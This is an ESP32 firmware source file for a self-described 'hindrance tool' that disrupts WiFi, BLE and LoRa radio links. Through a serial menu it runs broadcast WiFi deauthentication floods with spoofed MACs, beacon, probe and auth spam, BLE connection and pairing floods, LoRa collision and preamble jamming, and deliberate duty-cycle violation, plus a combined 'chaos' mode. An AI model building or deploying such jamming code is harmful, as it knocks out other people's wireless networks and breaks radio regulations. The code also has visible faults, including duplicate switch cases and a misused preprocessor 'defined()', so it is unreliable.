/*
 * SWAP Protocol Hindrance Tool
 * Runs on ESP32 Node A and Node B
 * Targets: WiFi, BLE, LoRa (SX1262)
 * No OLED. I2C only for INA219. UART only on Node A -> UNO Q.
 */

#include <Arduino.h>
#include <SPI.h>
#include <Wire.h>
#include <RadioLib.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// ============ COMPILE-TIME NODE ROLE ============
// Define exactly ONE of these before upload:
// #define NODE_ROLE_A    // Node A: has UART to UNO Q
// #define NODE_ROLE_B    // Node B: no UART to UNO Q

#if !defined(NODE_ROLE_A) && !defined(NODE_ROLE_B)
  #error "Must define NODE_ROLE_A or NODE_ROLE_B"
#endif

#if defined(NODE_ROLE_A) && defined(NODE_ROLE_B)
  #error "Cannot define both NODE_ROLE_A and NODE_ROLE_B"
#endif

// ============ PIN MAP (Locked per HW spec) ============
#define PIN_SPI_SCK       18
#define PIN_SPI_MISO      19
#define PIN_SPI_MOSI      23
#define PIN_LORA_NSS      21
#define PIN_LORA_RST      33
#define PIN_LORA_DIO1     26
#define PIN_LORA_BUSY     27
#define PIN_LORA_RXEN     25
#define PIN_LORA_TXEN     32

#define PIN_I2C_SDA       13
#define PIN_I2C_SCL       4

#ifdef NODE_ROLE_A
  #define PIN_UART_RX     16  // ESP32 RX <- UNO Q TX (D1)
  #define PIN_UART_TX     17  // ESP32 TX -> UNO Q RX (D0)
  #define UART_BAUD       9600
#endif

// ============ LORA CONFIG (Locked) ============
#define LORA_FREQ_MHZ     866.0
#define LORA_SF           7
#define LORA_BW_KHZ       125.0
#define LORA_CR           5   // 4/5
#define LORA_SYNC_WORD    0x12
#define LORA_TX_POWER     14  // dBm
#define LORA_TCXO_VOLTAGE 1.6

// ============ INA219 ADDRESSES ============
#define INA219_ADDR_MAIN  0x40  // ESP32 5V rail
#define INA219_ADDR_LORA  0x41  // LoRa 3.3V rail

// ============ HINDRANCE MODES ============
enum HindranceMode {
  MODE_IDLE = 0,
  // WiFi
  MODE_WIFI_DEAUTH,
  MODE_WIFI_BEACON_SPAM,
  MODE_WIFI_PROBE_SPAM,
  MODE_WIFI_AUTH_SPAM,
  // BLE
  MODE_BLE_ADV_SPAM,
  MODE_BLE_CONN_FLOOD,
  MODE_BLE_PAIRING_SPAM,
  // LoRa
  MODE_LORA_COLLISION,
  MODE_LORA_PREAMBLE_SPAM,
  MODE_LORA_DUTY_ABUSE,
  // Combined
  MODE_ALL_RADIO_CHAOS
};

enum ProtocolTarget {
  TARGET_WIFI  = 1 << 0,
  TARGET_BLE   = 1 << 1,
  TARGET_LORA  = 1 << 2,
  TARGET_ALL   = TARGET_WIFI | TARGET_BLE | TARGET_LORA
};

// ============ GLOBAL STATE ============
HindranceMode currentMode = MODE_IDLE;
ProtocolTarget activeTargets = TARGET_ALL;
bool hindranceRunning = false;
unsigned long modeStartTime = 0;
unsigned long packetsSent = 0;
unsigned long lastStatusPrint = 0;

// RadioLib SX1262
Module loraModule(PIN_LORA_NSS, PIN_LORA_DIO1, PIN_LORA_RST, PIN_LORA_BUSY);
SX1262 radio(&loraModule);

// INA219 registers
#define INA219_REG_CONFIG       0x00
#define INA219_REG_SHUNT_V      0x01
#define INA219_REG_BUS_V        0x02
#define INA219_REG_POWER        0x03
#define INA219_REG_CURRENT      0x04
#define INA219_REG_CALIBRATION  0x05

// ============ INA219 HELPERS ============
bool ina219WriteReg(uint8_t addr, uint8_t reg, uint16_t val) {
  Wire.beginTransmission(addr);
  Wire.write(reg);
  Wire.write(val >> 8);
  Wire.write(val & 0xFF);
  return Wire.endTransmission() == 0;
}

bool ina219ReadReg(uint8_t addr, uint8_t reg, uint16_t& val) {
  Wire.beginTransmission(addr);
  Wire.write(reg);
  if (Wire.endTransmission() != 0) return false;
  if (Wire.requestFrom(addr, (uint8_t)2) != 2) return false;
  val = (Wire.read() << 8) | Wire.read();
  return true;
}

void ina219Init(uint8_t addr) {
  // Config: 32V range, 2A max, 12-bit, continuous
  ina219WriteReg(addr, INA219_REG_CONFIG, 0x399F);
  // Calibration for 0.1 ohm shunt, 2A max -> 0.04mA LSB
  ina219WriteReg(addr, INA219_REG_CALIBRATION, 4096);
}

float ina219ReadBusVoltage(uint8_t addr) {
  uint16_t raw;
  if (ina219ReadReg(addr, INA219_REG_BUS_V, raw)) {
    return (raw >> 3) * 0.004; // 4mV LSB
  }
  return 0;
}

float ina219ReadCurrent(uint8_t addr) {
  uint16_t raw;
  if (ina219ReadReg(addr, INA219_REG_CURRENT, raw)) {
    int16_t signedRaw = (int16_t)raw;
    return signedRaw * 0.04; // 40uA LSB with cal=4096
  }
  return 0;
}

// ============ WIFI HINDRANCE ============
// Deauth frame template (802.11)
static const uint8_t deauthFrame[] = {
  0xC0, 0x00,           // Frame Control: Deauthentication
  0x00, 0x00,           // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Dest: Broadcast
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // Src (randomized at runtime)
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // BSSID (same as src)
  0x00, 0x00,           // Seq ctrl
  0x01, 0x00            // Reason: Unspecified
};

// Beacon frame template (minimal)
static const uint8_t beaconFrame[] = {
  0x80, 0x00,           // Frame Control: Beacon
  0x00, 0x00,           // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Dest: Broadcast
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // Src
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,  // BSSID
  0x00, 0x00,           // Seq ctrl
  // Fixed params
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,           // Beacon interval (100 TU)
  0x11, 0x04,           // Capability: ESS + Privacy
  // SSID IE
  0x00, 0x07,           // Tag: SSID, Len: 7
  'S', 'W', 'A', 'P', '_', 'A', 'P',
  // Supported rates IE
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24,
  // DS Parameter Set (Channel)
  0x03, 0x01, 0x01
};

void wifiSetChannel(uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void wifiSendRaw(const uint8_t* buf, size_t len) {
  esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
}

void wifiRandomizeMac(uint8_t* frame, size_t len) {
  for (int i = 0; i < 6; i++) {
    frame[10 + i] = esp_random() & 0xFF;        // Src
    frame[16 + i] = frame[10 + i];              // BSSID = Src
  }
  // Sequence control
  frame[22] = esp_random() & 0xFF;
  frame[23] = esp_random() & 0xFF;
}

void runWiFiDeauth() {
  uint8_t frame[sizeof(deauthFrame)];
  memcpy(frame, deauthFrame, sizeof(deauthFrame));
  wifiRandomizeMac(frame, sizeof(frame));
  wifiSendRaw(frame, sizeof(frame));
  packetsSent++;
}

void runWiFiBeaconSpam() {
  uint8_t frame[sizeof(beaconFrame)];
  memcpy(frame, beaconFrame, sizeof(frame));
  wifiRandomizeMac(frame, sizeof(frame));
  // Randomize SSID slightly
  frame[38] = 'A' + (esp_random() % 26);
  wifiSendRaw(frame, sizeof(frame));
  packetsSent++;
}

void runWiFiProbeSpam() {
  // Probe Request frame
  static const uint8_t probeReq[] = {
    0x40, 0x00,           // Probe Request
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00,
    0x00, 0x00,           // SSID: empty (broadcast probe)
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
  };
  uint8_t frame[sizeof(probeReq)];
  memcpy(frame, probeReq, sizeof(probeReq));
  wifiRandomizeMac(frame, sizeof(frame));
  wifiSendRaw(frame, sizeof(frame));
  packetsSent++;
}

void runWiFiAuthSpam() {
  // Auth frame (Open System)
  static const uint8_t authFrame[] = {
    0xB0, 0x00,           // Authentication
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
    0x00, 0x00,
    0x00, 0x00,           // Auth algo: Open
    0x01, 0x00,           // Seq: 1
    0x00, 0x00            // Status: Success
  };
  uint8_t frame[sizeof(authFrame)];
  memcpy(frame, authFrame, sizeof(authFrame));
  wifiRandomizeMac(frame, sizeof(frame));
  wifiSendRaw(frame, sizeof(frame));
  packetsSent++;
}

// ============ BLE HINDRANCE ============
BLEAdvertising* bleAdvertising = nullptr;
uint32_t bleAdvCount = 0;

void runBLEAdvSpam() {
  if (!bleAdvertising) return;
  
  BLEAdvertisementData advData;
  advData.setFlags(0x06); // General discoverable, BR/EDR not supported
  
  // Random manufacturer data
  uint8_t mfgData[20];
  for (int i = 0; i < 20; i++) mfgData[i] = esp_random() & 0xFF;
  advData.setManufacturerData(std::string((char*)mfgData, 20));
  
  // Random service UUID
  BLEUUID uuid((uint16_t)(0x1800 + (esp_random() % 100)));
  advData.setCompleteServices(uuid);
  
  // Random name
  char name[16];
  snprintf(name, 16, "SWAP_%04X", esp_random() & 0xFFFF);
  advData.setName(name);
  
  bleAdvertising->setAdvertisementData(advData);
  bleAdvertising->start();
  delay(10);
  bleAdvertising->stop();
  bleAdvCount++;
  packetsSent++;
}

void runBLEConnFlood() {
  // Initiate connections to random addresses (will fail, but consumes target resources)
  BLEAddress randAddr;
  for (int i = 0; i < 6; i++) {
    ((uint8_t*)&randAddr)[i] = esp_random() & 0xFF;
  }
  randAddr.setAddressType(BLE_ADDR_TYPE_RANDOM);
  
  BLEClient* client = BLEDevice::createClient();
  client->connect(randAddr);
  delay(5);
  client->disconnect();
  delete client;
  packetsSent++;
}

void runBLEPairingSpam() {
  // Send pairing requests via security manager
  // This is harder without active connection, so we spam connect with security
  BLEAddress randAddr;
  for (int i = 0; i < 6; i++) {
    ((uint8_t*)&randAddr)[i] = esp_random() & 0xFF;
  }
  randAddr.setAddressType(BLE_ADDR_TYPE_RANDOM);
  
  BLEClient* client = BLEDevice::createClient();
  client->setSecurityCallbacks(new BLESecurityCallbacks());
  client->connect(randAddr);
  if (client->isConnected()) {
    // Request pairing
    esp_ble_sec_t sec = ESP_BLE_SEC_ENCRYPT | ESP_BLE_SEC_AUTHENTICATED;
    esp_ble_gap_security_req(client->getPeerAddress().getNative()->bda, sec);
    delay(20);
    client->disconnect();
  }
  delete client;
  packetsSent++;
}

// ============ LORA HINDRANCE ============
void loraConfigureForHindrance() {
  // Use same params as SWAP but can tweak for specific attacks
  radio.setFrequency(LORA_FREQ_MHZ);
  radio.setSpreadingFactor(LORA_SF);
  radio.setBandwidth(LORA_BW_KHZ);
  radio.setCodingRate(LORA_CR);
  radio.setSyncWord(LORA_SYNC_WORD);
  radio.setOutputPower(LORA_TX_POWER);
  radio.setPreambleLength(8);
  radio.setTcxoVoltage(LORA_TCXO_VOLTAGE);
  
  // Explicit RF switch control (DIO2 not wired on Core1262-HF)
  radio.setRfSwitchTable(
    PIN_LORA_RXEN,  // RX enable
    PIN_LORA_TXEN,  // TX enable
    RADIOLIB_NC,    // Not used
    RADIOLIB_NC,    // Not used
    RADIOLIB_NC     // Not used
  );
}

void runLoRaCollision() {
  // Transmit a packet that collides with expected SWAP timing
  // SWAP uses ~41ms airtime at SF7/BW125, 5s interval
  // We transmit slightly before/after expected slot
  
  uint8_t payload[11] = {0};
  payload[0] = 0xDE;  // Collision marker
  payload[1] = 0xAD;
  for (int i = 2; i < 11; i++) payload[i] = esp_random() & 0xFF;
  
  // Transmit without waiting for CAD
  radio.startTransmit(payload, 11);
  packetsSent++;
}

void runLoRaPreambleSpam() {
  // Send long preamble only (no payload) to jam detection
  radio.setPreambleLength(65535); // Max preamble
  uint8_t dummy = 0;
  radio.startTransmit(&dummy, 1);
  radio.setPreambleLength(8); // Restore
  packetsSent++;
}

void runLoRaDutyAbuse() {
  // Exceed 1% duty cycle by rapid firing
  // At SF7/BW125, 11 bytes = ~41ms. 1% = 50ms/s.
  // We'll send 3 packets back-to-back = ~123ms > 1%
  
  uint8_t payload[11];
  for (int i = 0; i < 3; i++) {
    for (int j = 0; j < 11; j++) payload[j] = esp_random() & 0xFF;
    radio.startTransmit(payload, 11);
    delay(5); // Small gap
  }
  packetsSent += 3;
}

// ============ MAIN HINDRANCE LOOP ============
void runHindranceLoop() {
  if (!hindranceRunning) return;
  
  // WiFi modes
  if (activeTargets & TARGET_WIFI) {
    switch (currentMode) {
      case MODE_WIFI_DEAUTH:
        runWiFiDeauth();
        break;
      case MODE_WIFI_BEACON_SPAM:
        runWiFiBeaconSpam();
        break;
      case MODE_WIFI_PROBE_SPAM:
        runWiFiProbeSpam();
        break;
      case MODE_WIFI_AUTH_SPAM:
        runWiFiAuthSpam();
        break;
      default: break;
    }
  }
  
  // BLE modes
  if (activeTargets & TARGET_BLE) {
    switch (currentMode) {
      case MODE_BLE_ADV_SPAM:
        runBLEAdvSpam();
        break;
      case MODE_BLE_CONN_FLOOD:
        runBLEConnFlood();
        break;
      case MODE_BLE_PAIRING_SPAM:
        runBLEPairingSpam();
        break;
      default: break;
    }
  }
  
  // LoRa modes
  if (activeTargets & TARGET_LORA) {
    switch (currentMode) {
      case MODE_LORA_COLLISION:
        runLoRaCollision();
        break;
      case MODE_LORA_PREAMBLE_SPAM:
        runLoRaPreambleSpam();
        break;
      case MODE_LORA_DUTY_ABUSE:
        runLoRaDutyAbuse();
        break;
      default: break;
    }
  }
  
  // Combined chaos mode
  if (currentMode == MODE_ALL_RADIO_CHAOS) {
    static uint8_t chaosStep = 0;
    chaosStep = (chaosStep + 1) % 9;
    switch (chaosStep) {
      case 0: runWiFiDeauth(); break;
      case 1: runWiFiBeaconSpam(); break;
      case 2: runWiFiProbeSpam(); break;
      case 3: runBLEAdvSpam(); break;
      case 4: runBLEConnFlood(); break;
      case 5: runLoRaCollision(); break;
      case 6: runLoRaPreambleSpam(); break;
      case 7: runLoRaDutyAbuse(); break;
      case 8: delay(100); break; // Brief pause
    }
  }
  
  // Rate limiting (except duty abuse which self-limits)
  if (currentMode != MODE_LORA_DUTY_ABUSE && currentMode != MODE_ALL_RADIO_CHAOS) {
    delay(10); // ~100 ops/sec max
  }
}

// ============ SERIAL MENU ============
void printMenu() {
  Serial.println();
  Serial.println("===== SWAP HINDRANCE TOOL =====");
  Serial.printf("Node: %s\n", defined(NODE_ROLE_A) ? "A (UART to UNO Q)" : "B (Standalone)");
  Serial.printf("Mode: %d | Targets: 0x%X | Running: %s | Packets: %lu\n",
    currentMode, activeTargets, hindranceRunning ? "YES" : "NO", packetsSent);
  Serial.println();
  Serial.println("--- WiFi ---");
  Serial.println("  1  WiFi Deauth Flood");
  Serial.println("  2  WiFi Beacon Spam");
  Serial.println("  3  WiFi Probe Request Spam");
  Serial.println("  4  WiFi Auth Spam");
  Serial.println("--- BLE ---");
  Serial.println("  5  BLE Advertisement Spam");
  Serial.println("  6  BLE Connection Flood");
  Serial.println("  7  BLE Pairing Spam");
  Serial.println("--- LoRa ---");
  Serial.println("  8  LoRa Collision Injection");
  Serial.println("  9  LoRa Preamble Spam");
  Serial.println(" 10  LoRa Duty Cycle Abuse");
  Serial.println("--- Combined ---");
  Serial.println(" 11  ALL RADIO CHAOS");
  Serial.println("--- Control ---");
  Serial.println("  0  STOP (Idle)");
  Serial.println("  w  Toggle WiFi target");
  Serial.println("  b  Toggle BLE target");
  Serial.println("  l  Toggle LoRa target");
  Serial.println("  a  Toggle ALL targets");
  Serial.println("  s  Status + Power Readings");
  Serial.println("  r  Reset Counters");
  Serial.println("  h  Help (this menu)");
  Serial.print("> ");
}

void handleSerialCommand(char cmd) {
  switch (cmd) {
    case '0': currentMode = MODE_IDLE; hindranceRunning = false; break;
    case '1': currentMode = MODE_WIFI_DEAUTH; hindranceRunning = true; break;
    case '2': currentMode = MODE_WIFI_BEACON_SPAM; hindranceRunning = true; break;
    case '3': currentMode = MODE_WIFI_PROBE_SPAM; hindranceRunning = true; break;
    case '4': currentMode = MODE_WIFI_AUTH_SPAM; hindranceRunning = true; break;
    case '5': currentMode = MODE_BLE_ADV_SPAM; hindranceRunning = true; break;
    case '6': currentMode = MODE_BLE_CONN_FLOOD; hindranceRunning = true; break;
    case '7': currentMode = MODE_BLE_PAIRING_SPAM; hindranceRunning = true; break;
    case '8': currentMode = MODE_LORA_COLLISION; hindranceRunning = true; break;
    case '9': currentMode = MODE_LORA_PREAMBLE_SPAM; hindranceRunning = true; break;
    case '1': case '0': // '10' handled below
      break;
    case 'a': activeTargets = TARGET_ALL; break;
    case 'w': activeTargets ^= TARGET_WIFI; break;
    case 'b': activeTargets ^= TARGET_BLE; break;
    case 'l': activeTargets ^= TARGET_LORA; break;
    case 's': printStatus(); break;
    case 'r': packetsSent = 0; bleAdvCount = 0; modeStartTime = millis(); break;
    case 'h': printMenu(); break;
    default:
      if (cmd >= '0' && cmd <= '9') {
        // Handle '10' for LoRa Duty Abuse
        static char lastCmd = 0;
        if (lastCmd == '1' && cmd == '0') {
          currentMode = MODE_LORA_DUTY_ABUSE;
          hindranceRunning = true;
        }
        lastCmd = cmd;
      }
      break;
  }
  modeStartTime = millis();
  Serial.printf("\nMode set to %d, Targets=0x%X, Running=%s\n", currentMode, activeTargets, hindranceRunning ? "YES" : "NO");
}

void printStatus() {
  Serial.println();
  Serial.println("===== STATUS =====");
  Serial.printf("Uptime: %lu ms\n", millis());
  Serial.printf("Mode: %d (%s)\n", currentMode, hindranceRunning ? "RUNNING" : "IDLE");
  Serial.printf("Targets: WiFi=%s BLE=%s LoRa=%s\n",
    (activeTargets & TARGET_WIFI) ? "ON" : "OFF",
    (activeTargets & TARGET_BLE) ? "ON" : "OFF",
    (activeTargets & TARGET_LORA) ? "ON" : "OFF");
  Serial.printf("Packets sent: %lu\n", packetsSent);
  Serial.printf("BLE Adv count: %lu\n", bleAdvCount);
  
  // Power readings
  float vMain = ina219ReadBusVoltage(INA219_ADDR_MAIN);
  float iMain = ina219ReadCurrent(INA219_ADDR_MAIN);
  float vLoRa = ina219ReadBusVoltage(INA219_ADDR_LORA);
  float iLoRa = ina219ReadCurrent(INA219_ADDR_LORA);
  
  Serial.printf("Power - Main: %.2fV %.1fmA (%.2f mW) | LoRa: %.2fV %.1fmA (%.2f mW)\n",
    vMain, iMain, vMain * iMain, vLoRa, iLoRa, vLoRa * iLoRa);
  
  #ifdef NODE_ROLE_A
  Serial.println("UART to UNO Q: Connected");
  #else
  Serial.println("UART to UNO Q: N/A (Node B)");
  #endif
}

// ============ UART TO UNO Q (Node A only) ============
#ifdef NODE_ROLE_A
HardwareSerial unoSerial(2); // UART2 on GPIO16/17

void processUnoCommand(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return;
  
  // Forward single-char commands to hindrance engine
  if (cmd.length() == 1) {
    handleSerialCommand(cmd[0]);
    unoSerial.printf("OK: Mode %d\n", currentMode);
    return;
  }
  
  // Extended commands from UNO Q
  if (cmd.startsWith("MODE ")) {
    int m = cmd.substring(5).toInt();
    if (m >= 0 && m <= 11) {
      currentMode = (HindranceMode)m;
      hindranceRunning = (m != 0);
      modeStartTime = millis();
      unoSerial.printf("OK: Mode %d\n", m);
    }
  }
  else if (cmd == "STATUS") {
    float vMain = ina219ReadBusVoltage(INA219_ADDR_MAIN);
    float iMain = ina219ReadCurrent(INA219_ADDR_MAIN);
    float vLoRa = ina219ReadBusVoltage(INA219_ADDR_LORA);
    float iLoRa = ina219ReadCurrent(INA219_ADDR_LORA);
    unoSerial.printf("STATUS,%d,%lu,%.2f,%.1f,%.2f,%.1f\n",
      currentMode, packetsSent, vMain, iMain, vLoRa, iLoRa);
  }
  else if (cmd == "PING") {
    unoSerial.println("PONG");
  }
  else {
    unoSerial.println("ERR: Unknown cmd");
  }
}

void checkUnoSerial() {
  static String buffer = "";
  while (unoSerial.available()) {
    char c = unoSerial.read();
    if (c == '\n' || c == '\r') {
      if (buffer.length() > 0) {
        processUnoCommand(buffer);
        buffer = "";
      }
    } else {
      buffer += c;
    }
  }
}
#endif

// ============ SETUP ============
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  // I2C for INA219
  Wire.begin(PIN_I2C_SDA, PIN_I2C_SCL);
  ina219Init(INA219_ADDR_MAIN);
  ina219Init(INA219_ADDR_LORA);
  
  // SPI for LoRa
  SPI.begin(PIN_SPI_SCK, PIN_SPI_MISO, PIN_SPI_MOSI, PIN_LORA_NSS);
  
  // Initialize LoRa
  int state = radio.begin();
  if (state != RADIOLIB_ERR_NONE) {
    Serial.printf("LoRa init failed: %d\n", state);
    while (1) delay(1000);
  }
  loraConfigureForHindrance();
  radio.setDio1Action([]{ radio.setIrqFlag(); });
  Serial.println("LoRa ready");
  
  // WiFi init (promiscuous/raw mode)
  WiFi.mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  Serial.println("WiFi ready (raw mode)");
  
  // BLE init
  BLEDevice::init("SWAP_Hindrance");
  bleAdvertising = BLEDevice::getAdvertising();
  Serial.println("BLE ready");
  
  // UART to UNO Q (Node A only)
  #ifdef NODE_ROLE_A
  unoSerial.begin(UART_BAUD, SERIAL_8N1, PIN_UART_RX, PIN_UART_TX);
  Serial.println("UART to UNO Q ready on GPIO16/17 @ 9600");
  #endif
  
  printMenu();
}

// ============ MAIN LOOP ============
void loop() {
  // Serial menu input
  if (Serial.available()) {
    char c = Serial.read();
    handleSerialCommand(c);
  }
  
  // UNO Q UART input (Node A)
  #ifdef NODE_ROLE_A
  checkUnoSerial();
  #endif
  
  // Run hindrance
  runHindranceLoop();
  
  // Periodic status
  if (millis() - lastStatusPrint > 5000) {
    if (hindranceRunning) {
      Serial.printf("[%lu] Mode %d | Pkts: %lu | Targets: 0x%X\n",
        millis(), currentMode, packetsSent, activeTargets);
    }
    lastStatusPrint = millis();
  }
}